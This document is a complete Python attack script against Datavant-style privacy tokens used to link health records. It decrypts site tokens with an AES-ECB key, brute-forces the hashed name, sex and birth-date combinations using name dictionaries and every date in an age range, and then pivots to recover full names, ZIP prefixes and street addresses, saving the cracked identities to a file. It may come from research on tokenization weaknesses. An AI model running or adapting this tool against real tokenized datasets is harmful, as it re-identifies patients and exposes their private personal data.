#!/usr/bin/env python3
import argparse
import base64
import csv
import hashlib
import hmac
import re
from collections import Counter, defaultdict
from datetime import datetime, date
from typing import Dict, Any, Iterable, Tuple, Set, Optional
from jellyfish import soundex
from Crypto.Cipher import AES
import pandas as pd
from faker import Faker
from datetime import timedelta
import time

# =============================
# Normalization / helpers
# =============================
def norm(s: Any) -> str:
    return "".join(ch for ch in str(s or "").strip().lower() if ch.isalnum())

def norm_gender(g: Any) -> str:
    g = str(g or "").strip().lower()
    if g in ("m", "male"): return "m"
    if g in ("f", "female"): return "f"
    return "u"

def norm_dob(s: Any) -> str:
    s = str(s or "").strip()
    fmts = ("%Y-%m-%d", "%d.%m.%Y", "%m/%d/%Y", "%Y/%m/%d", "%Y%m%d")
    for f in fmts:
        try:
            return datetime.strptime(s, f).strftime("%Y%m%d")
        except ValueError:
            pass
    if len(s) == 8 and s.isdigit():
        return s
    return ""

def first_initial(fn: str) -> str:
    n = norm(fn)
    return n[0] if n else ""

def first3(fn: str) -> str:
    n = norm(fn)
    return n[:3] if n else ""

def time_attack(func, *args, label=None):
    start = time.time()
    result = func(*args)
    end = time.time()
    elapsed = end - start
    if label:
        print(f"[TIMER] {label}: {elapsed:.2f} seconds")
    return result, elapsed

def split_address(address, lang: str):
    """
    Split address into street and number using simple string operations instead of regex.
    For German ('de'): street name first, then number.
    For US ('us'): number first, then street name.
    """
    address = str(address).strip()
    if not address:
        return ""
    parts = address.split()
    if lang == "de":
        for i, part in enumerate(parts):
            if part and part[0].isdigit():
                street = " ".join(parts[:i]).strip()
                number = " ".join(parts[i:]).strip()
                return street.strip().replace("-", "").replace(" ", "")
    elif lang == "us":
        if parts and parts[0].isdigit():
            number = parts[0]
            street = " ".join(parts[1:]).strip()
        return street.strip().replace("-", "").replace(" ", "")
    return address.strip().replace("-", "").replace(" ", "")

# =============================
# Master token functions
# =============================
def master_sha256(token_input: str) -> bytes:
    return hashlib.sha256(token_input.encode("utf-8")).digest()  # 32 bytes

def master_hmac(master_salt: bytes, token_input: str) -> bytes:
    return hmac.new(master_salt, token_input.encode("utf-8"), hashlib.sha256).digest()  # 32 bytes

def parse_bytes(s: str, *, expect_len: Optional[int] = None) -> bytes:
    """Accept hex or utf-8; optionally enforce expected length."""
    try:
        b = bytes.fromhex(s)
    except ValueError:
        b = s.encode("utf-8")
    if expect_len is not None and len(b) != expect_len:
        raise ValueError(f"Expected {expect_len} bytes, got {len(b)}")
    return b

# =============================
# Site encryption (AES-ECB)
# =============================
def aes256_ecb_decrypt_b64(site_key_32: bytes, token_b64: str) -> bytes:
    """Decrypt base64-encoded site token to raw 32-byte master token."""
    ct = base64.b64decode(token_b64)
    if len(ct) % 16 != 0:
        raise ValueError("Ciphertext is not a multiple of AES block size.")
    cipher = AES.new(site_key_32, AES.MODE_ECB)  # AES-256 (32-byte key)
    pt = cipher.decrypt(ct)
    # Expect SHA-256 output length
    if len(pt) != 32:
        # Some pipelines might pack more; keep it but warn upstream if needed
        pass
    return pt

# =============================
# Token input builders
# =============================
def mk_T1(ln: str, fn: str, g: str, dob: str) -> str:
    fi = first_initial(fn)
    if not (ln and fi and g and dob): return ""
    return f"{norm(ln)}|{fi}|{norm_gender(g)}|{dob}"

def mk_T2(ln: str, fn: str, g: str, dob: str) -> str:
    sdx_ln = soundex(ln); sdx_fn = soundex(fn)
    if not (sdx_ln and sdx_fn and g and dob): return ""
    return f"{sdx_ln}|{sdx_fn}|{norm_gender(g)}|{dob}"

def mk_T4(ln: str, fn: str, g: str, dob: str) -> str:
    if not (ln and fn and g and dob): return ""
    return f"{norm(ln)}|{norm(fn)}|{norm_gender(g)}|{dob}"

def mk_T3(ln: str, fn: str, dob: str, zip3: str) -> str:
    if not (ln and fn and dob and zip3): return ""
    return f"{norm(ln)}|{norm(fn)}|{dob}|{zip3}"

# =============================
# Load and decrypt site tokens
# =============================
def load_site_tokens(path: str, cols: Iterable[str]) -> Dict[str, list]:
    with open(path, newline="", encoding="utf-8") as f:
        r = csv.DictReader(f)
        rows = list(r)
    return {"_RAW": rows}

def decrypt_columns(rows: list, site_key_32: bytes, colnames: Iterable[str]) -> Dict[str, Set[bytes]]:
    out: Dict[str, Set[bytes]] = {c: set() for c in colnames}
    successes = 0
    failures = 0
    for row in rows:
        for c in colnames:
            val = (row.get(c) or "").strip()
            if not val:
                continue
            try:
                mt = aes256_ecb_decrypt_b64(site_key_32, val)
                out[c].add(mt)
                successes += 1
            except Exception:
                failures += 1
                # keep going
    for c in colnames:
        print(f"[decrypt] {c}: unique master tokens={len(out[c])} (sample successes={successes}, failures={failures})")
    return out

# =============================
# Attack core
# =============================

# Helper for calculating all birthdays for ages 18 to 80
today = date.today()
min_age = 18
max_age = 80
min_year = today.year - max_age
max_year = today.year - min_age

def attack_entropy_first_T1(master_func, master_tokens: Set[bytes]) -> Dict[bytes, Tuple[str,str,str,str]]:
    """Dictionary attack against T1: ln|fi|g|dob. Return {master_token: (ln, fi, g, dob)}."""
    hits = {}
    for ln in TOP_LAST:
        for fi in "abcdefghijklmnopqrstuvwxyz":
            for g in SEX:
                """for dob in TOP_DOB:
                    inp = f"{norm(ln)}|{fi}|{g}|{dob}"
                    if not inp: continue
                    mt = master_func(inp)
                    if mt in master_tokens:
                        hits[mt] = (norm(ln), fi, g, dob)"""
                for year in range(min_year, max_year + 1):
                    for month in range(1, 13):
                        if month in [1, 3, 5, 7, 8, 10, 12]:
                            max_day = 31
                        elif month in [4, 6, 9, 11]:
                            max_day = 30
                        elif month == 2:
                            if (year % 4 == 0 and (year % 100 != 0 or year % 400 == 0)):
                                max_day = 29
                            else:
                                max_day = 28
                        else:
                            max_day = 31
                        for day in range(1, max_day + 1):
                            dob_obj = date(year, month, day)
                            dob = dob_obj.strftime('%Y%m%d')
                            inp = f"{norm(ln)}|{fi}|{g}|{dob}"
                            if not inp:
                                continue
                            mt = master_func(inp)
                            if mt in master_tokens:
                                hits[mt] = (norm(ln), fi, g, dob)
    return hits

def attack_entropy_first_T2(master_func, master_tokens: Set[bytes]) -> Dict[bytes, Tuple[str,str,str,str]]:
    """Dictionary attack against T2: sdx(ln)|sdx(fn)|g|dob. We store sdx codes."""
    hits = {}
    sdx_last = sorted({soundex(ln) for ln in TOP_LAST if soundex(ln)})
    sdx_first = sorted({soundex(fn) for fn in TOP_FIRST if soundex(fn)})

    for sdx_ln in sdx_last:
        for sdx_fn in sdx_first:
            for g in SEX:
                """for dob in TOP_DOB:
                    inp = f"{sdx_ln}|{sdx_fn}|{g}|{dob}"
                    if not inp: continue
                    mt = master_func(inp)
                    if mt in master_tokens:
                        hits[mt] = (sdx_ln, sdx_fn, g, dob)"""
                for year in range(min_year, max_year + 1):
                    for month in range(1, 13):
                        if month in [1, 3, 5, 7, 8, 10, 12]:
                            max_day = 31
                        elif month in [4, 6, 9, 11]:
                            max_day = 30
                        elif month == 2:
                            if (year % 4 == 0 and (year % 100 != 0 or year % 400 == 0)):
                                max_day = 29
                            else:
                                max_day = 28
                        else:
                            max_day = 31
                        for day in range(1, max_day + 1):
                            dob_obj = date(year, month, day)
                            dob = dob_obj.strftime('%Y%m%d')
                            inp = f"{sdx_ln}|{sdx_fn}|{g}|{dob}"
                            if not inp:
                                continue
                            mt = master_func(inp)
                            if mt in master_tokens:
                                hits[mt] = (sdx_ln, sdx_fn, g, dob)
    return hits

def pivot_to_T4_from_T1_T2(master_func,
                           T4_master_tokens: Set[bytes],
                           t1_hit: Tuple[str,str,str,str],
                           t2_hit: Tuple[str,str,str,str] = None) -> Dict[bytes, Tuple[str,str,str,str]]:
    """
    Use knowledge from T1 (ln, fi, g, dob) and optional T2 (sdx_fn constraint) to brute-force T4 (ln|fn|g|dob).
    """
    ln, fi, g, dob = t1_hit
    sdx_fn_constraint = t2_hit[1] if t2_hit else None  # (sdx_ln, sdx_fn, g, dob)
    out = {}
    for fn in TOP_FIRST:
        if not fn or norm(fn)[0:1] != fi:
            continue
        if sdx_fn_constraint and soundex(fn) != sdx_fn_constraint:
            continue
        t4_inp = mk_T4(ln, fn, g, dob)
        if not t4_inp:
            continue
        mt = master_func(t4_inp)
        if mt in T4_master_tokens:
            out[mt] = (ln, norm(fn), g, dob)
    return out

def pivot_to_T3_from_T4(master_func,
                        T3_master_tokens: Set[bytes],
                        t4_hit: Tuple[str,str,str,str]) -> Dict[bytes, Tuple[str,str,str,str]]:
    """
    Use knowledge from T4 (ln|fn|g|dob) to brute-force T3 (ln|fn|dob|zip3).
    """
    ln, fn, g, dob = t4_hit
    out = {}
    for zip3 in (f"{i:03}" for i in range(1000)):  # Iterate from 000 to 999
        t3_inp = f"{ln}|{fn}|{dob}|{zip3}"
        if not t3_inp:
            continue
        mt = master_func(t3_inp)
        if mt in T3_master_tokens:
            out[mt] = (ln, fn, dob, zip3)
    return out

def pivot_from_T4_to_T9(master_func, T9_master_tokens: Set[bytes], t4_hit: Tuple[str,str,str,str], address: str, lang: str) -> Dict[bytes, Tuple[str,str]]:
    """
    Use knowledge from T4 (ln|fn|g|dob) to brute-force T9 (fn|addr).
    """
    ln, fn, g, dob = t4_hit
    out = {}
    street = split_address(address, lang)
    if lang == 'de':
        # German: iterate numbers
        for num in range(1, 501):
            address_try = f"{street}{num}"
            t9_inp = f"{fn}|{address_try}"
            if not t9_inp:
                continue
            mt = master_func(t9_inp)
            if mt in T9_master_tokens:
                out[mt] = (fn, address_try)
    elif lang == 'us':
        # American: iterate numbers
        for num in range(1, 1001):
            address_try = f"{num}{street}"
            t9_inp = f"{fn}|{address_try}"
            if not t9_inp:
                continue
            mt = master_func(t9_inp)
            if mt in T9_master_tokens:
                out[mt] = (fn, address_try)
    else:
        # Unknown: use whole address without number iteration
        address_try = str(address).strip()
        t9_inp = f"{fn}|{address_try}"
        if not t9_inp:
            return out
        mt = master_func(t9_inp)
        if mt in T9_master_tokens:
            out[mt] = (fn, address_try)
    return out

# =============================
# Dictionaries
# =============================

def use_dictionaries(lang: str):
    """Use hardcoded dictionaries."""
    global TOP_FIRST, TOP_LAST, TOP_ADDRESS

    if lang == "de":
        with open("vornamen.txt", "r", encoding="utf-8") as f:
            TOP_FIRST = [line.strip().lower() for line in f if line.strip() and not line.startswith("#")]
        with open("nachnamen.txt", "r", encoding="utf-8") as f:
            TOP_LAST = [line.strip().lower() for line in f if line.strip() and not line.startswith("#")]
        with open("strassennamen.txt", "r", encoding="utf-8") as f:
            TOP_ADDRESS = [line.strip().lower() for line in f if line.strip() and not line.startswith("#")]
    elif lang == "us":
        with open("firstnames.txt", "r", encoding="utf-8") as f:
            TOP_FIRST = [line.strip().lower() for line in f if line.strip() and not line.startswith("#")]
        with open("lastnames.txt", "r", encoding="utf-8") as f:
            TOP_LAST = [line.strip().lower() for line in f if line.strip() and not line.startswith("#")]
        with open("streetnames.txt", "r", encoding="utf-8") as f:
            TOP_ADDRESS = [line.strip().lower() for line in f if line.strip() and not line.startswith("#")]
    else:
        raise ValueError(f"Unsupported language for hardcoded dictionaries: {lang}")
    print(f"[*] Using hardcoded dictionaries: firsts={len(TOP_FIRST)}, lasts={len(TOP_LAST)}, addresses={len(TOP_ADDRESS)}")

# =============================
# Similiar DB Distribution
# =============================

# The distribution file (for frequency lists) will be provided via CLI (--dist-file);
# we initialize the TOP_* structures lazily after parsing arguments.
TOP_FIRST: list = []
TOP_LAST: list = []
TOP_ADDRESS: list = []
SEX = ["m","f","u"]  # Can later be extended to derive from data if needed

def load_distribution(dist_file: str, top_n: int):
    """Load a distribution CSV (similar to ohio_cleaned.csv) and populate global TOP_ lists.

    Expected columns (case-sensitive): first_name, last_name, address
    Optional columns (ignored if missing): dob, year_of_birth, zip
    """
    global TOP_FIRST, TOP_LAST, TOP_ADDRESS
    df = pd.read_csv(dist_file)

    missing = [c for c in ["first_name", "last_name", "address"] if c not in df.columns]
    if missing:
        raise ValueError(f"Distribution file '{dist_file}' is missing required columns: {missing}")

    TOP_FIRST = df["first_name"].astype(str).str.lower().value_counts().head(top_n).index.tolist()
    TOP_LAST = df["last_name"].astype(str).str.lower().value_counts().head(top_n).index.tolist()
    TOP_ADDRESS = df["address"].astype(str).str.lower().value_counts().head(top_n).index.tolist()

    print(f"[*] Loaded distribution file '{dist_file}': top_n={top_n} (firsts={len(TOP_FIRST)}, lasts={len(TOP_LAST)}, addresses={len(TOP_ADDRESS)})")

# =============================
# Orchestrator
# =============================

def run_attack(args):
    # Load distribution for frequency-based dictionaries
    if args.dist_file:
        load_distribution(args.dist_file, args.top_n)
    elif args.dist_file == "":
        use_dictionaries(args.lang)
    else:
        raise SystemExit("--dist-file or --lang is required to provide the frequency distribution CSV")

    # Master function
    if args.master_salt:
        ms = parse_bytes(args.master_salt)  # any length ok for HMAC key
        master_func = lambda s: master_hmac(ms, s)
        print("[*] Using HMAC-SHA256(master_salt, token_input).")
    else:
        master_func = lambda s: master_sha256(s)
        print("[*] Using SHA-256(token_input) (no master salt).")

    # Site key: AES-256 requires 32 bytes
    site_key = parse_bytes(args.site_key, expect_len=32)
    print(f"[*] Using AES-256-ECB for site token decryption (key length={len(site_key)}).")

    cols = [c.strip() for c in args.columns.split(",")]
    # Load & decrypt
    raw = load_site_tokens(args.infile, cols)
    rows = raw["_RAW"]
    dec = decrypt_columns(rows, site_key, cols)

    # If everything is empty, bail early with a hint
    if all(len(dec[c]) == 0 for c in cols):
        print("[!] No master tokens decrypted. Check: correct AES mode (ECB), key (32 bytes), base64 format, and that tokens are actually encrypted site tokens.")
        return

    # Phase 1: attack lowest-entropy tokens first (T1, T2)
    t1_hits = {}
    if "T1" in dec:
        print("[*] Attacking T1 (ln|fi|g|dob)...")
        t1_hits, t1_time = time_attack(attack_entropy_first_T1, master_func, dec["T1"], label="T1")
        print(f"    -> Found {len(t1_hits)} T1 preimages")

    t2_hits = {}
    if "T2" in dec:
        print("[*] Attacking T2 (sdx(ln)|sdx(fn)|g|dob)...")
        t2_hits, t2_time = time_attack(attack_entropy_first_T2, master_func, dec["T2"], label="T2")
        print(f"    -> Found {len(t2_hits)} T2 preimages")

    # Phase 2: pivot into T4 using knowledge from T1 (and optionally T2)
    t4_pivot_hits = {}
    t4_time = None
    if "T4" in dec and t1_hits:
        print("[*] Pivoting to T4 (ln|fn|g|dob) using T1 (and T2 if available)...")
        # Index T2 hits by (g,dob) for quick lookup of sdx_fn constraint
        start = time.time()
        t2_idx = defaultdict(list)
        for mt, tpl in t2_hits.items():
            sdx_ln, sdx_fn, g, dob = tpl
            t2_idx[(g, dob)].append((sdx_ln, sdx_fn))
        # For each T1 hit, try to resolve fn candidates and test T4
        for mt1, (ln, fi, g, dob) in t1_hits.items():
            # If T2 constraint exists for same (g,dob), use it
            if (g, dob) in t2_idx:
                for (_sdx_ln, sdx_fn) in t2_idx[(g, dob)]:
                    # Only consider T2 entries consistent with ln’s soundex
                    if _sdx_ln != soundex(ln):
                        continue
                    out = pivot_to_T4_from_T1_T2(master_func, dec["T4"], (ln, fi, g, dob), ( _sdx_ln, sdx_fn, g, dob))
                    t4_pivot_hits.update(out)
            else:
                out = pivot_to_T4_from_T1_T2(master_func, dec["T4"], (ln, fi, g, dob), None)
                t4_pivot_hits.update(out)
        t4_time = time.time() - start
        print(f"    -> Resolved {len(t4_pivot_hits)} T4 preimages via pivot")
        print(f"[Timer] T4: {t4_time:.2f} seconds")

    # Phase 3: pivot into t3 using knowledge from t4
    t3_pivot_hits = {}
    if "T3" in dec and t4_pivot_hits:
        print("[*] Pivoting to T3 (ln|fn|dob|zip3) using T4...")
        start = time.time()
        for mt4, (ln, fn, g, dob) in t4_pivot_hits.items():
            out = pivot_to_T3_from_T4(master_func, dec["T3"], (ln, fn, g, dob))
            t3_pivot_hits.update(out)
        t3_time = time.time() - start
        print(f"    -> Resolved {len(t3_pivot_hits)} T3 preimages via pivot")
        print(f"[Timer] T3: {t3_time:.2f} seconds")

    # Phase 4: pivot to t9 using t4
    t9_pivot_hits = {}
    if "T9" in dec and t4_pivot_hits:
        print("[*] Pivoting to T9 (fn|address) using T4...")
        start = time.time()
        # From T4
        for mt4, (ln, fn, g, dob) in t4_pivot_hits.items():
            for address in TOP_ADDRESS:
                out = pivot_from_T4_to_T9(master_func, dec["T9"], (ln, fn, g, dob), address, args.lang)
                t9_pivot_hits.update(out)
                """t9_inp = f"{fn}|{norm(address)}"
                if not t9_inp:
                    continue
                mt = master_func(t9_inp)
                if mt in dec["T9"]:
                    t9_pivot_hits[mt] = (fn, norm(address))"""
        t9_time = time.time() - start
        print(f"    -> Resolved {len(t9_pivot_hits)} T9 preimages via pivot")
        print(f"[Timer] T9: {t9_time:.2f} seconds")

    # Report
    """print("\n=== RESULTS ===")
    if t1_hits:
        print(f"[T1] {len(t1_hits)} master tokens cracked")
        for mt, tpl in list(t1_hits.items())[:20]:
            print(f"  MT(hex)={mt.hex()}  ←  ln={tpl[0]} fi={tpl[1]} g={tpl[2]} dob={tpl[3]}")
    if t2_hits:
        print(f"[T2] {len(t2_hits)} master tokens cracked")
        for mt, tpl in list(t2_hits.items())[:20]:
            print(f"  MT(hex)={mt.hex()}  ←  sdx_ln={tpl[0]} sdx_fn={tpl[1]} g={tpl[2]} dob={tpl[3]}")
    if t4_pivot_hits:
        print(f"[T4] {len(t4_pivot_hits)} master tokens cracked (pivot)")
        for mt, tpl in list(t4_pivot_hits.items())[:20]:
            print(f"  MT(hex)={mt.hex()}  ←  ln={tpl[0]} fn={tpl[1]} g={tpl[2]} dob={tpl[3]}")
    if t3_pivot_hits:
        print(f"[T3] {len(t3_pivot_hits)} master tokens cracked (pivot)")
        for mt, tpl in list(t3_pivot_hits.items())[:20]:
            print(f"  MT(hex)={mt.hex()}  ←  ln={tpl[0]} fi={tpl[1]} dob={tpl[2]} zip3={tpl[3]}")"""

    # Save results to a text file
    with open(args.outfile, "w", encoding="utf-8") as result_file:
        if t1_hits:
            result_file.write(f"[T1] {len(t1_hits)} master tokens cracked\n")
            result_file.write(f"[TIMER] T1: {t1_time:.2f} seconds\n")
            for mt, tpl in t1_hits.items():
                result_file.write(f"MT(hex)={mt.hex()}  ←  ln={tpl[0]} fi={tpl[1]} g={tpl[2]} dob={tpl[3]}\n")
        if t2_hits:
            result_file.write(f"[T2] {len(t2_hits)} master tokens cracked\n")
            result_file.write(f"[TIMER] T2: {t2_time:.2f} seconds\n")
            for mt, tpl in t2_hits.items():
                result_file.write(f"MT(hex)={mt.hex()}  ←  sdx_ln={tpl[0]} sdx_fn={tpl[1]} g={tpl[2]} dob={tpl[3]}\n")
        if t4_pivot_hits:
            result_file.write(f"[T4] {len(t4_pivot_hits)} master tokens cracked (pivot)\n")
            result_file.write(f"[TIMER] T4: {t4_time:.2f} seconds\n")
            for mt, tpl in t4_pivot_hits.items():
                result_file.write(f"MT(hex)={mt.hex()}  ←  ln={tpl[0]} fn={tpl[1]} g={tpl[2]} dob={tpl[3]}\n")
        if t3_pivot_hits:
            result_file.write(f"[T3] {len(t3_pivot_hits)} master tokens cracked (pivot)\n")
            result_file.write(f"[TIMER] T3: {t3_time:.2f} seconds\n")
            for mt, tpl in t3_pivot_hits.items():
                result_file.write(f"MT(hex)={mt.hex()}  ←  ln={tpl[0]} fi={tpl[1]} dob={tpl[2]} zip3={tpl[3]}\n")
        if t9_pivot_hits:
            result_file.write(f"[T9] {len(t9_pivot_hits)} master tokens cracked (pivot)\n")
            result_file.write(f"[TIMER] T9: {t9_time:.2f} seconds\n")
            for mt, tpl in t9_pivot_hits.items():
                result_file.write(f"MT(hex)={mt.hex()}  ←  fn={tpl[0]} address={tpl[1]}\n")        

def main():
    ap = argparse.ArgumentParser(description="Attack Datavant-like tokens: decrypt site tokens, crack low-entropy keys, pivot to higher-entropy.")
    ap.add_argument("--in", dest="infile", required=True, help="CSV with token columns (e.g., T1,T2,T4)")
    ap.add_argument("--out", dest="outfile", required=True, help="Output file for results")
    ap.add_argument("--columns", required=True, help="Comma-separated token column names to use (e.g., T1,T2,T4)")
    ap.add_argument("--dist-file", default="", dest="dist_file", help="(Optional) Distribution CSV providing first_name,last_name,address columns (replaces hardcoded ohio_cleaned.csv)")
    ap.add_argument("--top-n", dest="top_n", type=int, default=500, help="How many top frequent values to take for names/addresses (default: 500)")
    ap.add_argument("--site-key", required=True, help="AES-128 key (hex or utf-8) for site token decryption")
    ap.add_argument("--lang", choices=["de", "us"], default="de", help="Language for hardcoded dictionaries if --dist-file is not used (default: de)")
    ap.add_argument("--master-salt", default="", help="(Optional) master salt (hex or utf-8); if empty uses SHA-256(no salt)")
    args = ap.parse_args()
    run_attack(args)

if __name__ == "__main__":
    main()
